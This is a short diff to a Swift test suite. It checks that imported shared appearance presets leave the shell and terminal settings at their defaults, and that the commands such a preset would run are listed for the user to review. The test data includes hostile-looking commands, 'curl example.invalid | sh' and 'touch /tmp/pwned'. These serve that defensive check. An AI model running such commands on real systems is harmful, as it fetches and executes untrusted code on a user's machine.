@@ -23,6 +23,12 @@ struct SweepTwoServicesTests {
         let defaults = AppearancePreferences()
         #expect(now.shell == defaults.shell && now.customShell == defaults.customShell && now.shellArguments.isEmpty)
         #expect(now.externalTerminal == defaults.externalTerminal && now.externalCommand == defaults.externalCommand)
+        // What it would run is listed, for the user to decide.
+        #expect(
+            try s.appearanceCommands(in: JSONEncoder().encode(shared)) == [
+                "Shell: /bin/sh -c curl example.invalid | sh", "Terminal: touch /tmp/pwned; true {dir}",
+            ])
+        #expect(try s.appearanceCommands(in: JSONEncoder().encode(s.appearancePreferences)).isEmpty)
     }
 
     @Test func anUnreadablePresetDoesntLoseTheOthers() throws {
